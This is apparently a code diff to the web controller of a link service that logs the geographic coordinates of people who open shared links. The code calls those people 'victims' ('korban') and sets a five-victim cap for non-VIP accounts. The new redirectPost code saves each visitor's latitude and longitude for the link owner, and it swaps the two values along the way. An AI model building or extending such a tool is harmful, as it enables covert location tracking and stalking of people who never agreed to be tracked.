@@ -80,7 +80,7 @@ export default class WebsController {
     }
 
     public async korban({ params, view, session }: HttpContextContract) {
-        const results = await Result.query().where('link_id', params.id).where('user_id', session.get('user').data.id)
+        const results = await Result.query().where('link_id', params.id).where('user_id', session.get('user').data.id).exec()
         return view.render('korban', { results: results });
     }
     
@@ -94,19 +94,25 @@ export default class WebsController {
 
     public async redirectPost({ params, request, response }: HttpContextContract) {
         const link = await Link.findBy('kode', params.kode)
+        await link?.load('user');
+        if(!link?.user.$original.is_vip) {
+            if (await (await Result.query().where('user_id', link?.user.$original.id)).length === 5) {
+                return response.json({ error: 'Anda sudah mencapai batas korban' })
+            }                
+        }
+
+        const results = new Result()
         if (link?.kode != params.kode) {
             return response.redirect('/');
         }
-        await Result.firstOrCreate({
-            longtitude: request.input('lat'),
-            latitude: request.input('lng'),
-        },{
-            link_id: link?.id,
-            user_id: link?.user_id,
-        });
+        results.user_id = link?.user_id;
+        results.latitude = request.input('lng');
+        results.longtitude = request.input('lat');
+        await link?.related('results').save(results);
+        
         return response.json({
-            status: 'success',
-        })
+                    status: 'success',
+                })
     }
 
 }
